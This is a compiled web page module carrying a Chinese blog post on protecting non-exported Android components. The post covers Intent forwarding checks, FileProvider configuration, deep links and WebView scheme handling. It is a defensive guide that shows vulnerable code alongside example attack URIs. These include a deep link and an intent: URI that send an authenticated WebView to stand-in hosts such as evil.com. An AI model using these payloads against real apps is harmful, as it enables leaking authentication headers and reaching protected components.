import{_ as n,c as a,o as s,a as t}from"./app.4bbc222c.js";const h='{"title":"\u5982\u4F55\u4FDD\u62A4\u5BFC\u51FA\u7EC4\u4EF6","description":"","frontmatter":{"title":"\u5982\u4F55\u4FDD\u62A4\u5BFC\u51FA\u7EC4\u4EF6","date":"2022-01-11T13:57:03.000Z","hide":false,"tags":["security","app","android"],"categories":["\u6280\u672F\u76F8\u5173"]},"headers":[{"level":2,"title":"\u56DB\u5927\u7EC4\u4EF6\u5982\u4F55\u4FDD\u62A4","slug":"\u56DB\u5927\u7EC4\u4EF6\u5982\u4F55\u4FDD\u62A4"},{"level":3,"title":"\u4E0D\u8981\u4ECE\u5916\u90E8\u8F93\u5165\u7684Intent\u76F4\u63A5\u521B\u5EFAIntent","slug":"\u4E0D\u8981\u4ECE\u5916\u90E8\u8F93\u5165\u7684intent\u76F4\u63A5\u521B\u5EFAintent"},{"level":3,"title":"\u5BF9\u76F4\u63A5\u521B\u5EFA\u7684Intent\u8FDB\u884C\u8DB3\u591F\u7684\u68C0\u67E5","slug":"\u5BF9\u76F4\u63A5\u521B\u5EFA\u7684intent\u8FDB\u884C\u8DB3\u591F\u7684\u68C0\u67E5"},{"level":2,"title":"DeepLink","slug":"deeplink"},{"level":3,"title":"shouldOverrideUrlLoading","slug":"shouldoverrideurlloading"},{"level":3,"title":"\u52A0\u8F7Durl\u95EE\u9898","slug":"\u52A0\u8F7Durl\u95EE\u9898"}],"relativePath":"app_security/android_howto_protected_unexported_components.md"}',e={},p=t(`<p>\u4E0A\u4E00\u7BC7\u8BB2\u4E86[\u4E3A\u4EC0\u4E48\u8981\u4FDD\u62A4\u672A\u5BFC\u51FA\u7EC4\u4EF6]](android_access_protected_components.md),\u8FD9\u4E00\u7BC7\u6765\u8BF4\u4E00\u4E0B\u5982\u4F55\u4FDD\u62A4. \u53D1\u73B0\u95EE\u9898,\u6211\u4EEC\u5C31\u8981\u6709\u89E3\u51B3\u4E4B\u9053. \u4E0A\u4E00\u7BC7\u4E2D\u6240\u6709\u7684\u653B\u51FB\u884C\u4E3A,\u6700\u7EC8\u90FD\u8981\u901A\u8FC7ProxyActivity\u4F5C\u4E3A\u5165\u53E3,\u6240\u4EE5\u8FD9\u91CC\u8FDB\u884C\u4E86\u963B\u65AD,\u90A3\u4E48\u5C31\u6CA1\u6709\u540E\u7EED\u7684\u95EE\u9898\u4E86. \u9488\u5BF9\u8FD9\u4E2A\u95EE\u9898,\u6709\u54EA\u4E9B\u653B\u51FB\u9762\u5462:</p><ul><li>\u5BFC\u51FA\u7684\u56DB\u5927\u7EC4\u4EF6</li><li>DeepLink</li></ul><h2 id="\u56DB\u5927\u7EC4\u4EF6\u5982\u4F55\u4FDD\u62A4" tabindex="-1">\u56DB\u5927\u7EC4\u4EF6\u5982\u4F55\u4FDD\u62A4 <a class="header-anchor" href="#\u56DB\u5927\u7EC4\u4EF6\u5982\u4F55\u4FDD\u62A4" aria-hidden="true">#</a></h2><p>\u5BFC\u51FA\u7684\u56DB\u5927\u7EC4\u4EF6\u4E3B\u8981\u662F\u901A\u8FC7Intent\u8FDB\u884C\u4F20\u9012\u6570\u636E,\u603B\u7684\u6765\u8BF4\u53EA\u8981\u6211\u4EEC:</p><ol><li>\u4E0D\u4FDD\u8BC1\u4ECEgetIntent\u4E4B\u7C7B\u7684\u5916\u90E8\u7528\u6237\u7ED9\u51FA\u7684Intent\u4E2D\u76F4\u63A5\u521B\u5EFAIntent.</li><li>\u5982\u679C\u76F4\u63A5\u521B\u5EFA\u4E86Intent,\u8981\u8FDB\u884C\u8DB3\u591F\u4E25\u683C\u7684\u68C0\u67E5.</li></ol><h3 id="\u4E0D\u8981\u4ECE\u5916\u90E8\u8F93\u5165\u7684intent\u76F4\u63A5\u521B\u5EFAintent" tabindex="-1">\u4E0D\u8981\u4ECE\u5916\u90E8\u8F93\u5165\u7684Intent\u76F4\u63A5\u521B\u5EFAIntent <a class="header-anchor" href="#\u4E0D\u8981\u4ECE\u5916\u90E8\u8F93\u5165\u7684intent\u76F4\u63A5\u521B\u5EFAintent" aria-hidden="true">#</a></h3><p>\u5982\u679C\u8FD9\u6761\u505A\u5230\u4E86,\u57FA\u672C\u4E0D\u5927\u53EF\u80FD\u4F1A\u51FA\u73B0\u95EE\u9898,\u4F46\u662F\u5173\u952E\u662F\u6709\u65F6\u5019\u6211\u4EEC\u7684\u4E1A\u52A1\u9700\u8981,\u5C31\u662F\u9700\u8981\u5B58\u5728\u7C7B\u4F3CProxyActivity\u7684\u529F\u80FD,\u90A3\u4E48\u8BE5\u600E\u4E48\u529E\u5462</p><h3 id="\u5BF9\u76F4\u63A5\u521B\u5EFA\u7684intent\u8FDB\u884C\u8DB3\u591F\u7684\u68C0\u67E5" tabindex="-1">\u5BF9\u76F4\u63A5\u521B\u5EFA\u7684Intent\u8FDB\u884C\u8DB3\u591F\u7684\u68C0\u67E5 <a class="header-anchor" href="#\u5BF9\u76F4\u63A5\u521B\u5EFA\u7684intent\u8FDB\u884C\u8DB3\u591F\u7684\u68C0\u67E5" aria-hidden="true">#</a></h3><ol><li><p>\u5C3D\u91CF\u4E0D\u628AIntent\u8F6C\u7ED9\u81EA\u5DF1,\u5982\u975E\u5FC5\u8981,\u53EA\u8F6C\u53D1Intent\u7ED9\u5176\u4ED6package.</p></li><li><p>\u8F6C\u53D1\u7ED9\u81EA\u5DF1\u7684\u8981\u4E25\u683C\u68C0\u67E5</p><ul><li>\u4E0D\u80FD\u5305\u542BIntent.FLAG_GRANT_READ_URI_PERMISSION,Intent.FLAG_GRANT_WRITE_URI_PERMISSION\u7B49flag</li><li>\u5BF9\u6570\u636E\u8981\u505A\u4E25\u683C\u6821\u9A8C,\u6BD4\u521A\u521A\u7ED9\u4E0A\u4E00\u7BC7\u4E2D\u7684AuthWebViewActivity\u7684Intent\u4E2D\u7684url\u53EA\u80FD\u662F\u6307\u5B9A\u7684Host</li></ul></li><li><p>Intent.parseUri\u7684\u65F6\u5019\u4E00\u5B9A\u4E0D\u8981\u63D0\u4F9BIntent.URI_ALLOW_UNSAFE <code>(startActivity(Intent.parseUri(url, Intent.URI_INTENT_SCHEME | Intent.URI_ALLOW_UNSAFE))</code>\u8FD9\u79CD\u662F\u975E\u5E38\u5371\u9669\u7684</p></li><li><p>FileProvider\u4E0D\u8981\u63D0\u4F9B<code> &lt;root-path name=&quot;root&quot; path=&quot;&quot;/&gt;</code>\u8FD9\u6837\u7684\u914D\u7F6E,\u786E\u4FDD\u5171\u4EAB\u7684\u76EE\u5F55\u8303\u56F4\u53EF\u63A7.</p></li></ol><h2 id="deeplink" tabindex="-1">DeepLink <a class="header-anchor" href="#deeplink" aria-hidden="true">#</a></h2><p>DeepLink\u5B9E\u9645\u4E0A\u662FIntent\u7684\u4E00\u79CD\u7279\u5B9A\u5F62\u5F0F,\u6BD4\u5982:</p><div class="language-xml line-numbers-mode"><pre><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>activity</span> <span class="token attr-name"><span class="token namespace">android:</span>name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>.AuthWebViewActivity<span class="token punctuation">&quot;</span></span> <span class="token attr-name"><span class="token namespace">android:</span>exported</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>false<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>intent-filter</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>action</span> <span class="token attr-name"><span class="token namespace">android:</span>name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>android.intent.action.VIEW<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>category</span> <span class="token attr-name"><span class="token namespace">android:</span>name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>android.intent.category.DEFAULT<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>data</span> <span class="token attr-name"><span class="token namespace">android:</span>scheme</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>victim<span class="token punctuation">&quot;</span></span> <span class="token attr-name"><span class="token namespace">android:</span>host</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>secure_handler<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>intent-filter</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>activity</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>\u8FD9\u91CC\u63D0\u4F9B\u4E86scheme <code>vicitim://</code>,\u8FD9\u79CD\u7C7B\u578B\u7684url\u4F1A\u6709\u7CFB\u7EDF\u81EA\u52A8\u8F6C\u53D1\u7ED9AuthWebViewActivity. \u6BD4\u5982\u5728\u6D4F\u89C8\u5668\u4E2D\u8F93\u5165<code>victim://some_victim_path?url=http://attacker_controlled.com</code></p><div class="language-java line-numbers-mode"><pre><code>webView<span class="token punctuation">.</span><span class="token function">loadUrl</span><span class="token punctuation">(</span><span class="token function">getIntent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getQueryParameter</span><span class="token punctuation">(</span><span class="token string">&quot;url&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">getAuthHeaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="shouldoverrideurlloading" tabindex="-1">shouldOverrideUrlLoading <a class="header-anchor" href="#shouldoverrideurlloading" aria-hidden="true">#</a></h3><p>shouldOverrideUrlLoading \u672A\u5FC5\u4E0EDeepLink\u76F4\u63A5\u76F8\u5173,\u4F46\u662F\u4E00\u822C\u90FD\u6709\u5173\u7CFB. \u5982\u679C\u91CD\u8F7D\u4E86shouldOverrideUrlLoading,\u800C\u4E14\u8BBF\u95EE\u7684\u9875\u9762\u53C8\u4E0D\u662F\u53EF\u4EE5\u5B8C\u5168\u4FE1\u4EFB\u7684(\u7EDD\u5927\u591A\u6570\u90FD\u662F\u8FD9\u79CD\u60C5\u51B5),\u90A3\u4E48\u5C31\u76F8\u5F53\u4E8E\u4E00\u4E2A\u672A\u5BFC\u51FA\u7684Webview\u53D8\u6210\u4E86\u5BFC\u51FA\u7684.</p><p>\u6BD4\u5982:</p><div class="language-java line-numbers-mode"><pre><code><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">shouldOverrideUrlLoading</span><span class="token punctuation">(</span><span class="token class-name">WebView</span> view<span class="token punctuation">,</span> <span class="token class-name">WebResourceRequest</span> request<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token class-name">Uri</span> uri <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">&quot;intent&quot;</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>uri<span class="token punctuation">.</span><span class="token function">getScheme</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    	<span class="token class-name">Intent</span> intent <span class="token operator">=</span> <span class="token class-name">Intent</span><span class="token punctuation">.</span><span class="token function">parseUri</span><span class="token punctuation">(</span>uri<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Intent</span><span class="token punctuation">.</span>URI_INTENT_SCHEME<span class="token punctuation">)</span><span class="token punctuation">;</span>
    	intent<span class="token punctuation">.</span><span class="token function">addCategory</span><span class="token punctuation">(</span><span class="token string">&quot;android.intent.category.BROWSABLE&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    	intent<span class="token punctuation">.</span><span class="token function">setComponent</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">startActivity</span><span class="token punctuation">(</span>intent<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">shouldOverrideUrlLoading</span><span class="token punctuation">(</span>view<span class="token punctuation">,</span> request<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p>\u5982\u679C\u9875\u9762\u4E2D\u7684js\u6267\u884C:</p><div class="language-js line-numbers-mode"><pre><code>location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">&quot;intent:#Intent;component=com.victim/.AuthWebViewActivity;S.url=http%3A%2F%2Fevil.com%2F;end&quot;</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>\u8FD9\u91CC\u5C31\u50CF\u524D\u9762\u63D0\u5230\u7684,\u53D8\u6210\u4E86\u4E00\u4E2A\u5BFC\u51FA\u7684\u7EC4\u4EF6.\u53EF\u4EE5\u4EFB\u610F\u8BBF\u95EE\u5185\u90E8\u672A\u5BFC\u51FA\u7EC4\u4EF6\u4E86.</p><p>\u4E0B\u9762\u8FD9\u4E9B\u5E94\u8BE5\u5199\u4E48?</p><h3 id="\u52A0\u8F7Durl\u95EE\u9898" tabindex="-1">\u52A0\u8F7Durl\u95EE\u9898 <a class="header-anchor" href="#\u52A0\u8F7Durl\u95EE\u9898" aria-hidden="true">#</a></h3><p>\u5982\u679CLoadUrl\u53EF\u63A7,\u6BD4\u5982\u66F4\u6539\u7684<code>webView.loadUrl(getIntent().getData().getQueryParameter(&quot;url&quot;), getAuthHeaders());</code>,\u90A3\u4E48\u8981\u8003\u8651:</p><ol><li>\u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6\u95EE\u9898 <a href="https://blog.csdn.net/zy_strive_2012/article/details/96474592" target="_blank" rel="noopener noreferrer">Android\u4E2DWebView\u7684\u8DE8\u57DF\u6F0F\u6D1E\u5206\u6790\u548C\u5E94\u7528\u88AB\u514B\u9686\u95EE\u9898\u60C5\u666F\u8FD8\u539F(\u514DRoot\u83B7\u53D6\u5E94\u7528\u6C99\u76D2\u6570\u636E)</a></li><li>XSS\u95EE\u9898 scheme\u662F<code>javascript://</code>,\u90A3\u4E48\u5C31\u53EF\u4EE5\u76F4\u63A5\u5728\u5F53\u524D\u9875\u9762\u6267\u884C\u4EFB\u610Fjs\u811A\u672C.</li></ol><p>\u9488\u5BF9\u8FD9\u4E9B\u95EE\u9898:</p><ol><li>\u4E0D\u8981\u5141\u8BB8webview\u8BBF\u95EEFileUrl</li><li>\u4E0D\u8981\u5141\u8BB8javascript\u7B49scheme,\u5E94\u8BE5\u53EA\u5141\u8BB8\u7279\u5B9A\u7684scheme.</li></ol><p>\u53C2\u8003\u6587\u6863: <a href="https://blog.oversecured.com/Android-Access-to-app-protected-components/#access-to-arbitrary-components-via-webview" target="_blank" rel="noopener noreferrer">Android: Access to app protected components</a></p>`,28),o=[p];function c(l,i,u,r,k,d){return s(),a("div",null,o)}var b=n(e,[["render",c]]);export{h as __pageData,b as default};